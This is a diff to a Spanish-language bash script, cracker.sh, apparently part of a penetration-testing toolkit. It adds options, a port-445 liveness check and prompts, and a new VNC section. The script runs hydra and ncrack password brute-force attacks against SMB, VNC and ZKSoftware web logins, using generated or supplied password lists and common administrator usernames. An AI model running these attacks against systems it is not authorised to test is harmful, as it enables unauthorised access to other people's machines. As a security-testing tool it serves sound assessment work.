@@ -10,7 +10,7 @@ OKORANGE='\033[93m'
 RESET='\e[0m'
                             
 
-
+max_ins=10
 
 echo -e '  ______                  _                         __   ______ '
 echo -e ' / _____)                | |                       /  | / __   |'
@@ -23,15 +23,46 @@ echo '									   daniel.torres@owasp.org'
 															
 echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"
 
-echo -e "\n\t $OKBLUE Nombre de la entidad (una palabra)? $RESET"	  
-read entidad	 
+
+
+while getopts ":e:d:h:" OPTIONS
+do
+            case $OPTIONS in
+            e)     ENTIDAD=$OPTARG;;
+            d)     DICTIONARY=$OPTARG;;            
+            ?)     printf "Opcion invalida: -$OPTARG\n" $0
+                          exit 2;;
+           esac
+done
+
+ENTIDAD=${ENTIDAD:=NULL}
+DICTIONARY=${DICTIONARY:=NULL}
+
+
+if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 
+
+echo "|              														 			"
+echo "| USO: cracker.sh -e nombre_empresa (una palabra) -d {Diccionario de passwords} (opcional)    "
+echo "|																		 			"
+echo ""
+exit
+fi
+######################
 
 rm enumeration/* 2>/dev/null
 rm vulnerabilities/* 2>/dev/null
 
-echo $entidad > base.txt
-passGen.sh -f base.txt -t top20 -o top.txt 
-rm base.txt
+if [ $DICTIONARY = NULL ] ; then
+
+	echo $ENTIDAD > base.txt
+	passGen.sh -f base.txt -t top20 -o top.txt 
+	rm base.txt
+else
+	mv $DICTIONARY top.txt	
+
+fi
+
+
 
 
 if [ -f .services/Windows.txt ]
@@ -44,12 +75,21 @@ then
 
 	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
 	 for ip in $(cat .services/Windows.txt); do		
-		echo -e "\n\t########### $ip #######"							
-		hydra -l administrador -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-		hydra -l administrator -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-		hydra -l soporte -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-		hydra -l $entidad -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null		
-		grep --color=never 'password:' logs/cracking/$ip-windows.txt > vulnerabilities/$ip-windows-password.txt
+		echo -e "\n\t########### $ip #######"	
+		hostlive=`nmap -n -Pn -p 445 $ip`
+		if [[ ${hostlive} == *"open"*  ]];then 
+		
+			hydra -l administrador -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l administrator -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l soporte -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l $entidad -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null		
+			grep --color=never 'password:' logs/cracking/$ip-windows.txt > vulnerabilities/$ip-windows-password.txt
+		
+		else
+			echo "Equipo apagado"
+		fi
+								
+		
 		
 	 done	
    fi # if bruteforce
@@ -59,13 +99,20 @@ fi
 
 if [ -f .services/ZKSoftware.txt ]
 then
+
+	echo -e "\n\t $OKBLUE Encontre servicios de ZKSoftware activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+		then       	 
       	  
-	  echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
-	  for ip in $(cat .services/ZKSoftware.txt); do
-		echo -e "\n\t########### $ip #######"			
-		passWeb.pl -t $ip -p 80 -s ZKSoftware -f top.txt > vulnerabilities/$ip-80-password.txt
-		echo ""			
-	 done	
+		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
+		for ip in $(cat .services/ZKSoftware.txt); do
+			echo -e "\n\t########### $ip #######"			
+			passWeb.pl -t $ip -p 80 -s ZKSoftware -f top.txt > vulnerabilities/$ip-80-password.txt
+			echo ""			
+		done
+	 fi	
 fi
 
 
@@ -177,6 +224,59 @@ then
 	fi # if bruteforce
 fi
 
+
+
+if [ -f .services/vnc.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then      	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
+	  for line in $(cat .services/vnc.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"					
+		ncrack_instances=`pgrep ncrack | wc -l`
+		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
+		then
+			ncrack --user 'administrador' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/$ip-vnc-password.txt &			
+			echo ""		
+		else
+			echo "Max instancias de ncrack ($max_ins)"
+			sleep 10;
+				
+		fi		
+		
+	  done
+	  
+	  ### wait to finish
+	  while true; do
+		ncrack_instances=`pgrep ncrack | wc -l`
+		if [ "$ncrack_instances" -gt 0 ]
+		then
+			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
+			sleep 30
+		else
+			break		  		 
+		fi				
+	  done
+	
+	  echo -e "\n\t########### Checking success #######"	
+	  for line in $(cat .services/vnc.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+						
+		grep --color=never "administrador" logs/cracking/$ip-vnc-password.txt > vulnerabilities/$ip-vnc-password.txt
+		echo ""			
+	  done
+	 
+	 
+	 
+	 
+	fi # if bruteforce
+fi
 
 
 insert-data.py
